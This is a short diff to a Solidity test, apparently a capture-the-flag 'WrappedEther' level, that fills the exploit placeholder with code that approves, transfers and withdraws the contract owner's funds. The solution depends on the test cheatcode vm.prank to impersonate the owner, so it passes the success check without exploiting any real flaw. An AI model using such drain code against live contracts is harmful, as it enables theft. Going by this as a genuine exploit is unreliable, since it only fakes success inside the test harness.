@@ -19,8 +19,10 @@ contract WrappedEtherTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        vm.prank(owner);
+        instance.approve(address(this), type(uint256).max);
+        instance.transferFrom(owner, address(this), 0.09 ether);
+        instance.withdrawAll();
         checkSuccess();
     }
 
